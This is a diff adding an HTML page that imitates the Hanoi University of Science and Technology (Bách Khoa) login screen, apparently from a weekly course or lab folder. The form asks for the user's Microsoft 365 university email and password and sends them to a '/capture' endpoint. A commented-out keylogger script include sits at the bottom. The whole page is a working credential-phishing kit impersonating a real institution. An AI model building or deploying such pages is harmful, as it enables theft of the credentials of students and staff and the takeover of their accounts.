@@ -1,0 +1,63 @@
+<!-- File: WEEK7/content/index.html -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập - Bách Khoa Hà Nội</title>
+    <link rel="stylesheet" href="/styles.css"> <!-- Liên kết đến file CSS -->
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="header-content">
+                <div class="logo-area">
+                    <!-- Placeholder cho logo Bách Khoa -->
+                    <!-- Lý tưởng nhất là nhúng ảnh thật vào đây -->
+                    <!-- Nếu có ảnh, đặt file vào content/images/ và cập nhật src="/images/logo.png" -->
+                    <img src="/images/logobkhn.png" alt="Logo Bách Khoa Hà Nội" class="logo">
+                </div>
+                <div class="header-text-block"> <!-- Gom chữ ĐẠI HỌC và BÁCH KHOA lại -->
+                    <div class="university-title">ĐẠI HỌC</div>
+                    <div class="bkhn-title">BÁCH KHOA</div> <!-- Đổi tên class cho rõ nghĩa -->
+                </div>
+            </div>
+            <!-- Xóa bỏ div.bkhn-bar -->
+        </header>
+
+        <main class="main-content">
+            <!-- Giữ nguyên phần nội dung chính và form đăng nhập -->
+            <h1 class="main-title">BÁCH KHOA HÀ NỘI</h1>
+            <p class="subtitle">MỘT TÌNH YÊU</p>
+            <p class="subtitle">MỘT TƯƠNG LAI</p>
+
+            <form action="/capture" method="post" class="login-form">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required>
+                    <span class="hint">Điền địa chỉ email 365 của bạn vào đây (tên đăng nhập là phần @hust.edu.vn)</span>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                    <span class="hint">Điền mật khẩu của email 365</span>
+                </div>
+
+                <button type="submit" class="connect-button">CONNECT</button>
+            </form>
+        </main>
+
+        <footer class="footer">
+            <!-- Giữ nguyên phần footer -->
+            <p>Powered by VNNIC in association with VBKIC</p>
+            <!-- Có thể thêm placeholder cho các logo VNNIC, VBKIC -->
+            <!-- <img src="/vnnic_logo.png" alt="VNNIC Logo"> -->
+            <!-- <img src="/vbkic_logo.png" alt="VBKIC Logo"> -->
+        </footer>
+    </div>
+
+    <!-- JavaScript keylogger -->
+    <!-- <script src="/keylogger.js"></script> -->
+
+</body>
+</html>
